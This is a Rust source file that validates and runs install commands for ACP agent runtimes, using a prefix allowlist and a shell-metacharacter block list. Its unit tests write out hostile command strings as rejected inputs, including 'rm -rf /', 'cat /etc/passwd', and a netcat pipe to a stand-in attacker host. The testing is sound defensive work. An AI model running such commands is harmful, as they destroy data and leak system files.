//! ACP runtime installation logic.
//!
//! Executes predefined install commands from runtime metadata to install agents.

use anyhow::{Context, Result};
use std::process::Command;

/// Command whitelist prefixes (prevent command injection)
const ALLOWED_PREFIXES: &[&str] = &[
    "npm install",
    "cargo install",
    "brew install",
    "pip install",
];

/// Shell metacharacters that could be used for command injection
const SHELL_METACHARACTERS: &[&str] = &[
    ";",
    "&&",
    "||",
    "|",
    "$(",
    "`",
    ">",
    "<",
    "&",
];

/// Validate that an install command is safe to execute
fn validate_install_command(cmd: &str) -> Result<()> {
    // Check if command starts with an allowed prefix
    if !ALLOWED_PREFIXES
        .iter()
        .any(|prefix| cmd.starts_with(prefix))
    {
        return Err(anyhow::anyhow!("Install command not in whitelist: {}", cmd));
    }

    // Reject commands containing shell metacharacters that could enable injection
    for meta in SHELL_METACHARACTERS {
        if cmd.contains(meta) {
            return Err(anyhow::anyhow!(
                "Install command contains prohibited shell metacharacter '{}': {}",
                meta,
                cmd
            ));
        }
    }

    Ok(())
}

/// Install a specific ACP runtime by executing its install command
pub async fn install_acp_runtime(runtime_id: &str) -> Result<String> {
    let metadata = crate::agent::runtime_metadata::known_acp_runtime_exact(runtime_id)
        .ok_or_else(|| anyhow::anyhow!("Unknown runtime: {}", runtime_id))?;

    let install_cmd = metadata
        .install_command
        .ok_or_else(|| anyhow::anyhow!("No install command for: {}", runtime_id))?;

    // Security check: command must be in whitelist
    validate_install_command(install_cmd)?;

    // Execute install command via shell (spawn_blocking to avoid blocking async runtime)
    let install_cmd = install_cmd.to_string();
    let output = tokio::task::spawn_blocking(move || {
        Command::new("sh").arg("-c").arg(&install_cmd).output()
    })
    .await
    .context("Failed to spawn blocking task")?
    .context("Failed to execute install command")?;

    if output.status.success() {
        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(anyhow::anyhow!("Install failed: {}", stderr))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_install_command() {
        // Valid commands
        assert!(validate_install_command("npm install -g @block/goose").is_ok());
        assert!(validate_install_command("pip install hermes-agent").is_ok());
        assert!(validate_install_command("brew install something").is_ok());
        assert!(validate_install_command("cargo install ergatai").is_ok());

        // Commands not in whitelist
        assert!(validate_install_command("rm -rf /").is_err());
        assert!(validate_install_command("curl | sh").is_err());

        // Commands with shell metacharacters (command injection attempts)
        assert!(validate_install_command("npm install evil && rm -rf /").is_err());
        assert!(validate_install_command("pip install pkg; cat /etc/passwd").is_err());
        assert!(validate_install_command("npm install evil || echo hacked").is_err());
        assert!(validate_install_command("npm install evil | nc attacker.com 1234").is_err());
        assert!(validate_install_command("npm install $(whoami)").is_err());
        assert!(validate_install_command("npm install `whoami`").is_err());
        assert!(validate_install_command("npm install evil > /tmp/stolen").is_err());
    }

    #[tokio::test]
    async fn test_install_unknown_runtime() {
        let result = install_acp_runtime("nonexistent-runtime").await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Unknown runtime"));
    }
}
